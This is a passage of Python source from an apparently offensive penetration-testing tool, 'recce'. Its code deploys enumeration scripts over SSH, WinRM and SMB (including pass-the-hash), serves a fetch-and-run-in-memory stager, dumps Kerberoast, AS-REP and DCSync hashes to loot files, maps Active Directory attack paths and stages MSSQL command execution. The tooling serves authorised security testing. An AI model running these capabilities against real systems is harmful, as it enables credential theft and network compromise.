    # block (so `recce ingest enum.txt` lands on the real enumerated host with no
    # --host needed), then by hostname, else synthesize.
    iface_ips = [i.get("ip") for i in (topo or {}).get("interfaces", []) if i.get("ip")]
    for ip in iface_ips:
        if ip in hosts:
            if hn and hn not in hosts[ip].hostnames:
                hosts[ip].hostnames.append(hn)
            _tag_host_os(hosts[ip], parsed)
            return hosts[ip], True
    if hn:
        for h in hosts.values():
            if hn.lower() in [x.lower() for x in h.hostnames] or \
               hn.lower() == (h.hostname or "").lower():
                _tag_host_os(h, parsed)
                return h, True
    if iface_ips:                              # a real IP from the enum, just not in scope yet
        host = hosts.get(iface_ips[0]) or Host(
            ip=iface_ips[0],
            subnet=".".join(iface_ips[0].split(".")[:3]) + ".0/24", enumerated=True)
        if hn and hn not in host.hostnames:
            host.hostnames.append(hn)
        _tag_host_os(host, parsed)
        return host, (iface_ips[0] in hosts)
    key = hn or os.path.splitext(os.path.basename(args.loot))[0]
    host = hosts.get(f"local:{key}") or Host(ip=f"local:{key}")
    if hn and hn not in host.hostnames:
        host.hostnames.append(hn)
    _tag_host_os(host, parsed)
    return host, (host.ip in hosts)


def _tag_host_os(host, parsed) -> None:
    if not host.os_family and parsed.get("os"):
        host.os_family = parsed["os"].capitalize()


def _ingest_service_output(svc: dict, paths: dict, args) -> int:
    """Fold recce-service.sh per-service findings into the datastore as confirmed
    service-enum Vulns on the matching host:port (creating a host entry if needed)."""
    from . import ingest
    from .models import Host, Port
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    vulns = ingest.service_findings_to_vulns(svc)
    by_ip: dict[str, list] = {}
    for v in vulns:
        by_ip.setdefault(v.ip, []).append(v)
    hosts_by_ip = {h.ip: h for h in store.all_hosts()}
    added_total = created = touched = 0
    for ip, vs in by_ip.items():
        h = hosts_by_ip.get(ip)
        if h is None:
            h = Host(ip=ip, subnet=".".join(ip.split(".")[:3]) + ".0/24",
                     enumerated=True)
            for pnum in sorted({v.port for v in vs if v.port}):
                h.ports.append(Port(portid=pnum, protocol="tcp", state="open",
                                    vuln_scanned=True))
            created += 1
        have = {(x.title, x.port) for x in h.vulns}
        added = [v for v in vs if (v.title, v.port) not in have]
        if not added:
            continue
        h.vulns.extend(added)
        aff = {v.port for v in added}
        for p in h.ports:
            if p.portid in aff:
                p.vuln_scanned = True
        store.upsert_host(h)
        added_total += len(added)
        touched += 1
    print(f"[+] Ingested {added_total} service finding(s) across {touched} host(s)"
          + (f" ({created} new host entry/entries)" if created else "") + ".")
    print("    Source: recce-service.sh output -> Vulnerabilities sheet "
          "(source 'service-enum'; advisory 'test X' lines kept as 'potential').")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _fold_loot(host, text: str, source: str) -> tuple[int, int, int]:
    """Fold recce-enum.sh/.ps1 output text into a host: local findings (deduped by
    category/vector), AV/EDR defenses, and high-signal findings promoted to Vulns.
    Sets privesc_checked. Returns (added, total_rows, promoted). Shared by the
    `ingest` command and the `deploy` orchestrator so both fold identically."""
    from . import ingest
    parsed = ingest.parse_loot(text)
    new_rows = ingest.to_local_findings(parsed, source)
    have = {(f.get("category"), f.get("vector")) for f in host.local_findings}
    added = []
    for r in new_rows:
        key = (r["category"], r["vector"])
        if key not in have:
            have.add(key)
            added.append(r)
    host.local_findings.extend(added)
    known = set(host.defenses)
    for d in ingest.extract_defenses(text):
        if d not in known:
            known.add(d)
            host.defenses.append(d)
    have_v = {v.key for v in host.vulns}
    promoted = [v for v in ingest.promote_to_vulns(host.ip, host.local_findings)
                if v.key not in have_v]
    host.vulns.extend(promoted)
    # Backfill listening-service ground truth (binary path, owning service,
    # loopback-only listeners) from the on-target scripts onto the host's ports.
    ingest.backfill_ports(host, ingest.parse_listeners(text))
    # Observed network topology (own interfaces/routes/ARP/peers) -> reachability map.
    topo = ingest.parse_topology(text)
    if topo:
        host.topology = topo
    host.privesc_checked = True
    return len(added), len(new_rows), len(promoted)


def cmd_ingest(args: argparse.Namespace) -> int:
    from . import ingest
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first so there's a "
              "workbook to fold findings into.")
        return 1
    if not os.path.exists(args.loot):
        print(f"[x] Loot file not found: {args.loot}")
        return 1
    with open(args.loot, "r", errors="replace") as fh:
        text = fh.read()
    parsed = ingest.parse_loot(text)
    if not parsed["is_recce"]:
        # Maybe it's per-service enumeration output (recce-service.sh) instead.
        svc = ingest.parse_service_output(text)
        if svc["is_service"] and svc["findings"]:
            return _ingest_service_output(svc, paths, args)
        print("[!] This doesn't look like recce-enum.sh/.ps1 output (no "
              "'recce-enum host=...' banner). Parsing [!] lines anyway.")
    topo = ingest.parse_topology(text)
    if not parsed["findings"] and not topo:
        print("[!] No [!] findings or NETWORK block in that loot - nothing to ingest.")
        return 0

    source = os.path.basename(args.loot)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    host, existed = _resolve_ingest_host(store, parsed, args, topo)
    added, total, promoted = _fold_loot(host, text, source)
    store.upsert_host(host)
    where = "existing host" if existed else "new host entry"
    hn = f" ({parsed['hostname']})" if parsed["hostname"] else ""
    print(f"[+] Ingested {added} finding(s) from {source} into {where} "
          f"{host.ip}{hn}"
          + (f"; {total - added} already present" if total != added else "")
          + ".")
    if topo:
        nn = len(topo.get("neighbors", [])); npeers = len(topo.get("peers", []))
        nif = len(topo.get("interfaces", []))
        print(f"    Folded on-target topology: {nif} interface(s), {nn} ARP "
              f"neighbour(s), {npeers} live peer(s) -> observed-reachability map.")
    if promoted:
        print(f"    Promoted {promoted} high-signal finding(s) to the "
              "Vulnerabilities sheet.")
    print(f"    OS: {host.os_family or 'unknown'}. See the Priv-Esc tab "
          "(rows tagged 'on-target finding').")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _deploy_worker(host, ssh_creds, win_creds, timeout, loot_dir,
                   stager=None, authmap=None):
    """Run the on-target enum script on one host remotely, save the raw loot, fold
    it into the host. Returns (host, transport, added, promoted, error)."""
    from . import deploy
    transport, out, err = deploy.deploy_one(host, ssh_creds, win_creds, timeout,
                                            stager=stager, authmap=authmap)
    if not out:
        return host, transport, 0, 0, (err or "no output returned")
    try:
        with open(os.path.join(loot_dir, f"{host.ip}.txt"), "w", errors="replace") as fh:
            fh.write(out)
    except OSError:
        pass
    added, _total, promoted = _fold_loot(host, out, f"deploy:{transport or 'remote'}")
    return host, transport, added, promoted, None


def cmd_deploy(args: argparse.Namespace) -> int:
    """Push + run recce's read-only local-enum / priv-esc scripts across every host
    we have credentials for (SSH / WinRM / SMB), then fold the results in."""
    from . import deploy
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first so there are "
              "hosts to deploy to.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    ssh_creds = _ssh_creds_of(args)
    win_creds = _creds_of(args)
    if win_creds and getattr(args, "hash", None):
        win_creds["hash"] = args.hash          # pass-the-hash for SMB/WinRM
    if not ssh_creds and not win_creds:
        print("\n" + "!" * 64)
        print("[x] deploy needs credentials. Give --ssh-user (+ --ssh-pass/--ssh-key) "
              "for Linux,")
        print("    and/or -u/-p (+ -d domain, or --hash) for Windows WinRM/SMB.")
        print("!" * 64)
        store.close()
        return 1

    hosts = _selected_hosts(store.all_hosts(), args)
    # nxc precheck: which protocols do these creds ACTUALLY authenticate to? Deploy
    # only where they truly work (and pick that transport), instead of guessing
    # from open ports. Skipped with --no-validate or when nxc isn't installed.
    authmap: dict = {}
    if not getattr(args, "no_validate", False):
        print("[*] Checking which hosts accept the creds (nxc smb/winrm/ssh) ...")
        authmap = deploy.validate([h.ip for h in hosts], ssh_creds, win_creds)
        if authmap:
            n_win = sum(1 for a in authmap.values() if a.get("winrm"))
            n_smb = sum(1 for a in authmap.values() if a.get("smb"))
            n_ssh = sum(1 for a in authmap.values() if a.get("ssh"))
            print(f"    creds valid on: {n_win} WinRM, {n_smb} SMB-admin, {n_ssh} SSH "
                  "host(s).")
        else:
            print("    (nxc unavailable or no results - falling back to open-port "
                  "selection.)")
    the_plan = deploy.plan(hosts, ssh_creds, win_creds, authmap or None)
    deployable = [(h, t) for h, t in the_plan if t]
    skipped = [h for h, t in the_plan if not t]
    if not deployable:
        print("[!] No hosts have a usable transport + matching credentials.")
        print("    Need an open SSH (22) / WinRM (5985) / SMB (445) port and the "
              "matching cred set. Run `enum` first, or widen your creds.")
        store.close()
        return 1

    by_t: dict[str, int] = {}
    for _h, t in deployable:
        by_t[t] = by_t.get(t, 0) + 1
    print(f"[*] Deploy plan: {len(deployable)} host(s) reachable "
          f"({', '.join(f'{n}×{t}' for t, n in sorted(by_t.items()))})"
          + (f"; {len(skipped)} skipped (no transport/creds)" if skipped else "") + ".")
    use_stager = getattr(args, "stager", False)
    if use_stager:
        print("    Windows hosts fetch + run recce-enum.ps1 IN MEMORY from a local "
              "HTTP stager (no temp file); falls back to the push path if a host "
              "can't route back to you.")
    else:
        print("    Scripts are READ-ONLY (recce-enum.sh/.ps1). SSH & WinRM run in "
              "memory (no artifact); SMB drops to %TEMP% and deletes after.")
    print("    Confirm this is within your rules of engagement.")
    if getattr(args, "dry_run", False):
        print(f"\n  WILL RUN ({len(deployable)}):")
        for h, t in sorted(deployable, key=lambda ht: _ip_key(ht[0].ip)):
            print(f"    {h.ip:<16} -> {t}" + ("  (+http stager if reachable)"
                                              if use_stager and t != "ssh" else ""))
        if skipped:
            print(f"\n  UNABLE / SKIPPED ({len(skipped)}):")
            for h in sorted(skipped, key=lambda x: _ip_key(x.ip)):
                print(f"    {h.ip:<16} -- {deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}")
        print("\n[*] Dry run - nothing was executed. Drop --dry-run to deploy.")
        store.close()
        return 0

    # Optional HTTP stager for in-memory Windows exec.
    stager = None
    if use_stager:
        from .stager import Stager, detect_lhost
        lhost = getattr(args, "lhost", None) or detect_lhost()
        if not lhost:
            print("[x] --stager needs --lhost <your-ip that targets can reach>; "
                  "could not autodetect one.")
            store.close()
            return 1
        try:
            files = {"recce-enum.ps1": open(deploy.WINDOWS_SCRIPT, "rb").read()}
        except OSError as e:
            print(f"[x] Could not read the Windows script: {e}")
            store.close()
            return 1
        try:
            stager = Stager(lhost, files)
            stager.__enter__()
        except OSError as e:
            print(f"[x] Could not start the HTTP stager on {lhost}: {e}")
            store.close()
            return 1
        print(f"[*] HTTP stager on http://{lhost}:{stager.port}/ (serving "
              "recce-enum.ps1 to Windows hosts, torn down when done).")

    workers = max(1, args.workers)
    timeout = getattr(args, "timeout", None) or deploy.DEFAULT_TIMEOUT
    loot_dir = os.path.join(args.output_dir, "loot")
    try:
        os.makedirs(loot_dir, exist_ok=True)
    except OSError:
        loot_dir = paths["raw"]
    print(f"[*] Deploying to {len(deployable)} host(s) with {workers} worker(s); "
          f"loot -> {loot_dir}/ ...")
    completed = 0
    total = len(deployable)
    start = time.monotonic()
    errs: list[tuple[str, str]] = []
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = {ex.submit(_deploy_worker, h, ssh_creds, win_creds, timeout,
                                 loot_dir, stager, authmap or None): h.ip
                       for h, _t in deployable}
            for fut in as_completed(futures):
                ip = futures[fut]
                try:
                    host, transport, added, promoted, err = fut.result()
                except Exception as e:  # noqa: BLE001
                    _record_issues(store, paths, ip, [{"phase": "deploy",
                                   "level": "error", "message": f"deploy crashed: {e}"}])
                    completed += 1
                    errs.append((ip, f"crashed: {e}"))
                    print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                          f"{_progress(completed, total, start)}")
                    continue
                completed += 1
                if err:
                    _record_issues(store, paths, ip, [{"phase": "deploy",
                                   "level": "warning",
                                   "message": f"deploy via {transport or '?'}: {err}"}])
                    errs.append((ip, err))
                    print(f"    [{completed}/{total}] {ip}: {transport or '-'} FAILED "
                          f"- {err}{_progress(completed, total, start)}")
                    continue
                _persist_host(store, paths, ip, "deploy", host)
                bits = f"{added} finding(s)" + (f", {promoted} promoted" if promoted else "")
                print(f"    [{completed}/{total}] {ip}: {transport} OK ({bits})"
                      f"{_progress(completed, total, start)}")
    finally:
        if stager is not None:
            stager.__exit__(None, None, None)
    # Hosts we never attempted (no transport / creds didn't validate) are the
    # "unable to complete" bucket - write them to the workbook too, so the report
    # shows every host's outcome, not just the ones we reached.
    for h in skipped:
        _record_issues(store, paths, h.ip, [{"phase": "deploy", "level": "warning",
                       "message": "not deployed: "
                       + deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}])
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()

    ok = total - len(errs)
    print(f"\n{'=' * 60}")
    print(f"  DEPLOY RESULTS: {ok} succeeded · {len(errs)} errored · "
          f"{len(skipped)} unable")
    print(f"{'=' * 60}")
    if errs:
        print(f"  ERRORED ({len(errs)}) - reached but did not complete:")
        for ip, msg in sorted(errs, key=lambda x: _ip_key(x[0])):
            print(f"    {ip:<16} -- {msg}")
    if skipped:
        print(f"  UNABLE ({len(skipped)}) - never attempted:")
        for h in sorted(skipped, key=lambda x: _ip_key(x.ip)):
            print(f"    {h.ip:<16} -- "
                  f"{deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}")
    print(f"\n[+] Loot saved in {loot_dir}/. Findings folded into local_findings "
          "+ the Priv-Esc tab.")
    if errs or skipped:
        print("    Errored / unable hosts are logged on the Overview issues tab.")
    print(f"    Next: recce attackpath -o {args.output_dir}  (or writeups).")
    return 0


def _collect_scan_files(paths: list[str]) -> list[str]:
    """Expand files / directories / globs into a list of nmap scan files. For a
    same-basename -oA set (base.xml + base.gnmap + base.nmap) keep only the richest
    format (xml > grepable > normal) so one scan isn't imported three times."""
    import glob
    found: list[str] = []
    for p in paths:
        if os.path.isdir(p):
            for pat in ("*.xml", "*.gnmap", "*.grep", "*.nmap"):
                found += sorted(glob.glob(os.path.join(p, pat)))
        elif os.path.exists(p):
            found.append(p)
        else:
            found += sorted(glob.glob(p))          # maybe a glob pattern
    rank = {".xml": 0, ".gnmap": 1, ".grep": 1, ".nmap": 2}
    best: dict[str, tuple[int, str]] = {}
    order: list[str] = []
    for f in found:
        base, ext = os.path.splitext(f)
        r = rank.get(ext.lower(), 3)
        if base not in best:
            best[base] = (r, f)
            order.append(base)
        elif r < best[base][0]:
            best[base] = (r, f)
    return [best[b][1] for b in order]


def cmd_import(args: argparse.Namespace) -> int:
    """Import an already-completed nmap scan (XML -oX or grepable -oG) and build /
    update the workbook - no scanning, no network. Folds hosts into the datastore,
    runs the offline enrichment (version->CVE, AD roles, SMB signing), sets the
    checkmarks, and preserves any existing tracking."""
    from . import vulndb
    files = _collect_scan_files(args.files)
    if not files:
        print("[x] No nmap scan files found. Point at .xml (-oX) or .gnmap (-oG) "
              "files, a directory, or a glob.")
        return 1
    parsed: list[Host] = []
    for f in files:
        hs = np.parse_nmap_file(f)
        print(f"    {os.path.basename(f)}: {len(hs)} host(s)")
        parsed.extend(hs)
    if not parsed:
        print("[x] Nothing parsed. Point at nmap XML (-oX, best), grepable "
              "(-oG), or normal (-oN, .nmap) output.")
        return 1

    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)          # honour existing ticks first
    if not store.get_meta("engagement"):
        store.set_meta("engagement", args.title)

    by_ip: dict[str, list[Host]] = {}
    for h in parsed:
        by_ip.setdefault(h.ip, []).append(h)
    use_ss = getattr(args, "searchsploit", False) and exploits.available()
    enum_only = getattr(args, "enum_only", False)
    n_hosts = n_ports = n_findings = n_scanned = 0
    for ip, group in by_ip.items():
        subnet = ".".join(ip.split(".")[:3]) + ".0/24" if ip.count(".") == 3 else ""
        host = _fold_host(ip, group, {ip: subnet})
        host.enumerated = True
        if not enum_only:
            for p in host.ports:                  # scan ran scripts here -> vuln step done
                if p.scripts and not p.vuln_scanned:
                    p.vuln_scanned = True
                    n_scanned += 1
        ad.identify_roles(host)
        ad.parse_signing_and_ntlm(host)
        vulndb.assess_host_inplace(host)          # offline version->CVE/CWE findings
        if use_ss:
            exploits.enrich_hosts([host])
        store.upsert_host(host)                    # merges with existing (tracking kept)
        n_hosts += 1
        n_ports += len(host.open_ports)
        n_findings += len(host.vulns)

    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print(f"\n[+] Imported {n_hosts} host(s) / {n_ports} open port(s) from "
          f"{len(files)} file(s): {n_findings} offline finding(s), "
          f"{n_scanned} port(s) marked vuln-scanned (had NSE output).")
    print("    Checklist 'Enumerated'"
          + ("" if enum_only else " + 'Vuln-scan' (where scripts ran)")
          + " are ticked. Run `vulns` to add recce's deeper detection, or "
          "`status` to see what's left.")
    return 0


def cmd_bloodhound(args: argparse.Namespace) -> int:
    """Import SharpHound and/or Certipy (ADCS) output, identify AD
    misconfigurations + vulnerabilities, map the shortest paths from YOUR account
    (or any authenticated user) to Domain Admin, and stage the follow-on actions.

    Simple credentialed run:  recce ad loot.zip -u alice -p 'Passw0rd' -d corp.local
    Add ADCS:                 recce ad loot.zip certipy.json -u alice -p ... -d corp.local
    Airgapped, stdlib-only; every command is pre-filled with your credentials."""
    from . import bloodhound as bh
    from . import adcs

    srcs = args.paths if isinstance(args.paths, list) else [args.paths]
    for s in srcs:
        if not os.path.exists(s):
            print(f"[x] Not found: {s}")
            return 1

    # Credentials: prefer the simple -u/-p/-d; fall back to --creds 'DOM/user:secret'.
    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        secret = args.password or ""
        is_hash = bool(re.fullmatch(r"[0-9a-fA-F]{32}", secret or ""))
        creds = {"domain": domain, "user": user, "secret": secret,
                 "is_hash": is_hash, "dc_ip": args.dc_ip or ""}
    elif args.creds:
        c = _parse_cred_spec(args.creds)
        creds = {"domain": c.domain, "user": c.username, "secret": c.secret,
                 "is_hash": c.kind == "nthash", "dc_ip": args.dc_ip or ""}

    # Where attack paths start: explicit --owned, else YOUR account (simple default),
    # else any authenticated user.
    owned = set()
    if args.owned:
        for chunk in args.owned:
            owned.update(o.strip() for o in chunk.split(",") if o.strip())
    elif creds and creds["user"]:
        owned = {creds["user"]}
        if creds["domain"]:
            owned.add(f"{creds['user']}@{creds['domain']}")

    # Classify each input: SharpHound graph vs Certipy ADCS JSON.
    sh_paths = [s for s in srcs if bh.is_sharphound(s)]
    certipy_paths = [s for s in srcs if adcs.is_certipy(s)]
    unknown = [s for s in srcs if s not in sh_paths and s not in certipy_paths]
    for u in unknown:
        print(f"[!] {u} isn't recognised as SharpHound or Certipy output - skipped.")

    if sh_paths:
        print(f"[*] Parsing SharpHound: {', '.join(os.path.basename(p) for p in sh_paths)}")
        analysis = bh.analyze(sh_paths[0], owned=owned, creds=creds)
        for extra in sh_paths[1:]:                       # merge extra collections' findings
            more = bh.analyze(extra, owned=owned, creds=creds)
            analysis["findings"].extend(more["findings"])
            analysis["domains"].extend(more["domains"])
    else:
        analysis = bh.empty_analysis()

    if certipy_paths:
        print(f"[*] Parsing Certipy ADCS: {', '.join(os.path.basename(p) for p in certipy_paths)}")
        for cp in certipy_paths:
            analysis["findings"].extend(adcs.findings(cp))

    # Optional LIVE Kerberos capture (roast / AS-REP / DCSync): run the published
    # impacket tools to grab the real hashes and fold each capture in as a proven
    # finding before we sort + fold into the totals.
    _ad_live_kerberos(args, bh, creds, sh_paths, analysis)

    # Re-sort merged findings, fill in the operator's credentials, refresh stats.
    analysis["findings"].sort(key=lambda f: _SEV_ORDER.get(f["severity"], 5))
    bh.fill_creds(analysis, creds)
    analysis["stats"]["findings"] = len(analysis["findings"])

    st = analysis["stats"]
    if st.get("nodes"):
        print(f"[+] Graph: {st['nodes']} node(s), {st['edges']} edge(s) "
              f"({', '.join(f'{k}={v}' for k, v in sorted(st['by_type'].items()))})")

    fs = analysis["findings"]
    if fs:
        by_sev: dict[str, int] = {}
        for f in fs:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        adcs_n = sum(1 for f in fs if f["category"].startswith("adcs-"))
        print(f"[+] {len(fs)} AD finding(s)"
              + (f" ({adcs_n} ADCS/ESC)" if adcs_n else "") + ": "
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
        for f in fs[:10]:
            print(f"      [{f['severity'].upper():8}] {f['title']} - {f['principal']}")
        if len(fs) > 10:
            print(f"      ... and {len(fs) - 10} more (see the AD Findings sheet)")

    paths_found = analysis["paths"]
    if paths_found:
        print(f"[+] {len(paths_found)} attack path(s) to a high-value target:")
        for p in paths_found[:5]:
            who = "ANY user" if p.get("any_user") else p["start"]
            print(f"      {who} -> {p['target']}  ({p['length']} hop): {p['chain']}")
    elif sh_paths:
        print("[!] No path to a high-value target from "
              + (f"{', '.join(sorted(owned))}" if owned else "any authenticated user")
              + " in this collection.")
    if analysis["kerberos"]:
        print(f"[+] {len(analysis['kerberos'])} Kerberos action(s) staged "
              "(see the AD Attack Paths sheet).")

    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    if not store.get_meta("engagement"):
        store.set_meta("engagement", args.title)
    store.set_meta("ad_bloodhound", json.dumps(analysis))
    # Merge domain facts (trusts, functional level, MachineAccountQuota) so the
    # Active Directory sheet reflects the import even without a network scan.
    from .models import Domain
    for dom in analysis["domains"]:
        name = (dom.get("name") or "").lower()
        if not name:
            continue
        existing = store.get_domain(name)
        d = existing or Domain(name=name)
        d.functional_level = d.functional_level or str(dom.get("functionallevel") or "")
        d.machine_account_quota = d.machine_account_quota or str(
            dom.get("machineaccountquota") or "")
        d.trusts = d.trusts or [
            {"name": t.get("TargetDomainName"), "direction": t.get("TrustDirection"),
             "type": t.get("TrustType")} for t in dom.get("trusts") or []]
        if "bloodhound" not in d.sources:
            d.sources.append("bloodhound")
        store.upsert_domain(d)

    # Feed the AD findings into the MAIN totals + writeups by attaching them as
    # Vulns on the DC / domain host (keyed by --dc-ip when given, so they merge
    # onto the scanned DC rather than creating a duplicate).
    if analysis["findings"]:
        from .models import Host
        dom_name = analysis["domains"][0]["name"] if analysis["domains"] else ""
        ad_ip = (creds and creds.get("dc_ip")) or dom_name or "active-directory"
        vulns = bh.findings_to_vulns(analysis, ad_ip, dom_name)
        replace = getattr(args, "replace_ad", False)
        host = store.get_host(ad_ip)
        removed = 0
        if host is None:
            host = Host(ip=ad_ip, hostnames=[dom_name] if dom_name else [],
                        os_family="Windows")
            if creds and creds.get("dc_ip"):
                host.roles = ["Domain Controller"]
        elif replace:
            # Drop the previously-imported AD/ADCS findings so a re-import reflects
            # the CURRENT state (fixed items disappear); other host data is kept.
            before = len(host.vulns)
            host.vulns = [v for v in host.vulns
                          if v.source not in ("bloodhound", "adcs")]
            removed = before - len(host.vulns)
        host.enumerated = True
        have = {v.key for v in host.vulns}
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        # merge=False on replace so the old AD vulns aren't re-introduced by the
        # union-merge (we've already loaded and rewritten the full host).
        store.upsert_host(host, merge=not replace)
        msg = (f"    -> {len(vulns)} AD finding(s) folded into the main severity "
               f"totals + writeups (host {ad_ip})")
        if replace:
            msg += f"; replaced {removed} prior AD finding(s)"
        print(msg + ".")

    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    written = []
    if analysis["findings"]:
        written.append("AD Findings")
    if analysis["paths"] or analysis["kerberos"]:
        written.append("AD Attack Paths")
    if written:
        print(f"    -> {' + '.join(written)} sheet(s) written to the workbook.")
    else:
        print("    -> Nothing to import (no AD findings or paths in the input).")
    return 0


def _ad_shot(args, name, command, output):
    """Render a terminal-output proof screenshot of a live Kerberos capture into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import mssql, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(mssql.proof_html(command, output, prompt="# "))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"ad_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] proof screenshot -> {path}")
    return path


def _ad_live_kerberos(args, bh, creds, sh_paths, analysis):
    """Run the opted-in live Kerberos captures, fold the proven findings into the
    analysis, write the captured hashes to engagement/loot/, and screenshot each."""
    do_roast = getattr(args, "roast", False)
    do_asrep = getattr(args, "asrep", False)
    do_dcsync = getattr(args, "dcsync", False)
    if not (do_roast or do_asrep or do_dcsync):
        return
    if not (creds and creds.get("secret")):
        print("[!] --roast/--asrep/--dcsync need credentials (-u/-p or --creds) - skipped.")
        return
    if not creds.get("dc_ip"):
        print("[!] --roast/--asrep/--dcsync need --dc-ip (airgapped: no DNS) - skipped.")
        return
    graph = None
    if sh_paths:
        try:
            graph = bh.load_graph(sh_paths[0])
        except Exception:  # noqa: BLE001 - a bad graph never blocks the live run
            graph = None
    print("[*] Live Kerberos capture (read-only ticket requests / replication)...")
    live = bh.live_kerberos(creds, graph, do_roast=do_roast,
                            do_asrep=do_asrep, do_dcsync=do_dcsync)
    loot_dir = os.path.join(args.output_dir, "loot")
    for kind, fname, mode in (("kerberoast", "kerberoast.hash", 13100),
                              ("asrep", "asrep.hash", 18200),
                              ("dcsync", "secretsdump.txt", None)):
        run = live["runs"].get(kind)
        if not run:
            continue
        if run.get("error"):
            print(f"      [!] {kind}: {run['error']}")
            continue
        n = len(run.get("hashes", []))
        if kind == "dcsync":
            print(f"      [+] DCSync replicated {n} account hash(es)")
            if run.get("output"):
                os.makedirs(loot_dir, exist_ok=True)
                with open(os.path.join(loot_dir, fname), "w") as fh:
                    fh.write(run["output"])
                print(f"          loot -> {os.path.join(loot_dir, fname)}")
        else:
            print(f"      [+] {kind}: captured {n} hash(es) (hashcat -m {mode})")
            if run.get("hashes"):
                os.makedirs(loot_dir, exist_ok=True)
                with open(os.path.join(loot_dir, fname), "w") as fh:
                    fh.write("\n".join(h["hash"] for h in run["hashes"]) + "\n")
                print(f"          loot -> {os.path.join(loot_dir, fname)}")
        if run.get("output"):
            _ad_shot(args, kind, run.get("command", kind), run["output"])
    if live["findings"]:
        analysis["findings"].extend(live["findings"])
        analysis["stats"]["findings"] = len(analysis["findings"])
        print(f"    -> {len(live['findings'])} proven capture(s) folded into the "
              "findings + main totals.")


def _mssql_shot(args, ip, name, banner, command, output):
    """Render a faithful terminal screenshot of an executed MSSQL action into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import mssql, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(mssql.proof_html(command, output, banner=banner))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"mssql_{ip.replace(':', '_')}_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] {ip}: proof screenshot -> {path}")
    return path


def cmd_mssql(args: argparse.Namespace) -> int:
    """MSSQL offensive enumeration: credential-free pre-auth probes (SQL Browser +
    TDS pre-login), then - with credentials - the nxc access/privilege matrix and
    the full MSSQLPwner-style runbook + attack chain, pre-filled with your creds."""
    from . import mssql
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run MSSQL.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "dc_ip": args.dc_ip or ""}

    active = not args.no_probe
    analysis = mssql.analyze(hosts, creds=creds, active=active,
                             lhost=args.lhost or "<LHOST>", **_probe_kwargs(args, "mssql"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No MSSQL endpoints in the datastore (no port 1433 / ms-sql "
              "service). Run `enum` against the SQL hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} MSSQL endpoint(s):")
    for t in tgts:
        extra = []
        if t.get("version"):
            extra.append(mssql.version_name(t["version"]))
        if t.get("encryption"):
            extra.append(f"encryption={t['encryption']}")
        if t.get("instances"):
            extra.append(f"{len(t['instances'])} instance(s) via SQL Browser")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(extra))

    # Auto-run the nxc access/privilege matrix when creds + tool are present.
    ran_nxc = False
    if creds and not args.no_run:
        tool = mssql.nxc_tool()
        if tool:
            ran_nxc = True
            for t in tgts:
                res, err = mssql.run_nxc_mssql(t["ip"], creds, port=t["port"],
                                               local_auth=args.local_auth)
                if res is None:
                    print(f"      [!] nxc mssql {t['ip']}: {err}")
                    continue
                t["access"], t["admin"] = res["access"], res["admin"]
                if res["access"]:
                    lvl = "SYSADMIN (Pwn3d!)" if res["admin"] else "login OK"
                    print(f"      [+] {t['ip']}:{t['port']}  {lvl} as {creds['user']}")
                    if res["admin"]:
                        analysis["findings"].insert(0, mssql._finding(
                            "critical", "Credentials are sysadmin on this MSSQL instance",
                            f"{t['ip']}:{t['port']}",
                            f"{creds['user']} authenticates as sysadmin (xp_cmdshell / RCE).",
                            "nxc / impacket-mssqlclient",
                            mssql._fill("nxc mssql <ip> -u <user> -p <pass> -x whoami",
                                        mssql._ctx(t, creds)),
                            "Least-privilege the login; remove sysadmin.",
                            ["CWE-250", "CWE-269"]))
        else:
